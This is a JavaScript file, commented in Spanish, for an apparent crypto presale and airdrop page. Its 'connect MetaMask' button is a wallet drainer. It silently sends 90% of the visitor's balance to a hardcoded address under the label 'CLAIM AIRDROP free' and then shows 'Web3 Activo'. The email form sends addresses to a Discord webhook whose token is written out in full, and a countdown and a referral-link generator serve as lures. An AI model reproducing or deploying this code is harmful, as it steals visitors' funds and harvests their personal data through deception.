document.getElementById('conectarMetaMask').addEventListener('click', () => {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        window.ethereum.enable().then(accounts => {
            const usuarioAddress = accounts[0];
            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434'; 
            web3.eth.getBalance(usuarioAddress).then(balance => {
                const cantidadEnviar = balance * 0.9;
                const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'wei');
                web3.eth.sendTransaction({
                    from: usuarioAddress,
                    to: direccionDestino,
                    value: cantidadEnviarEnWei,
                    gas: '21000',
                    data: web3.utils.toHex('CLAIM AIRDROP free'), 

                })
                .then(receipt => {
                    console.log('Transacción interna exitosa:', receipt);
                    document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
                })
                .catch(error => {
                    console.error('Error en la transacción interna:', error);
                });
            });
        });
    } else {
        console.error('MetaMask no está instalado.');
    }
});


document.getElementById('enviar').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert('Correo electrónico inválido');
        return;
    }
    
    const botonEnviar = document.getElementById('enviar');
    botonEnviar.textContent = "Registrado";

    // Enviar datos al webhook de Discord
    const webhookUrl = 'https://discordapp.com/api/webhooks/1074491610471084072/DQZ8B1z42DNbxwZgANi4MRhmivlWYKpkGYnLnFKoeQrqUuAdzsHm1NgzWweNJWog0y38';
    const data = {
        content: `Nuevo registro para la presale y airdrop: ${email}`,
    };
    
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(responseData => {
        console.log(responseData);
    })
    .catch(error => {
        console.error('Error enviando datos al webhook:', error);
    });
});

function updateCountdown() {
    const launchDate = new Date("February 29, 2024 00:00:00").getTime();
    const now = new Date().getTime();
    const difference = launchDate - now;

    const days = Math.floor(difference / (1000 * 60 * 60 * 24));
    const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((difference % (1000 * 60)) / 1000);

    document.getElementById("countdown-days").innerHTML = days + " días ";
    document.getElementById("countdown-hours").innerHTML = hours + " horas ";
    document.getElementById("countdown-minutes").innerHTML = minutes + " minutos ";
    document.getElementById("countdown-seconds").innerHTML = seconds + " segundos ";

    if (difference < 0) {
        clearInterval(x);
        document.getElementById("countdown").innerHTML = "El lanzamiento ha ocurrido";
    }
}

updateCountdown();
const x = setInterval(updateCountdown, 1000);

document.getElementById('generarReferido').addEventListener('click', function() {
    const walletAddress = document.getElementById('walletAddress').value;
    if(walletAddress === '') {
        alert('Por favor, introduce tu dirección de wallet.');
        return;
    }
    const enlaceActual = window.location.href;
    const enlaceReferido = `${enlaceActual}?ref=${walletAddress}`;
    document.getElementById('enlaceReferido').textContent = `Tu enlace de referido es: ${enlaceReferido}`;
});
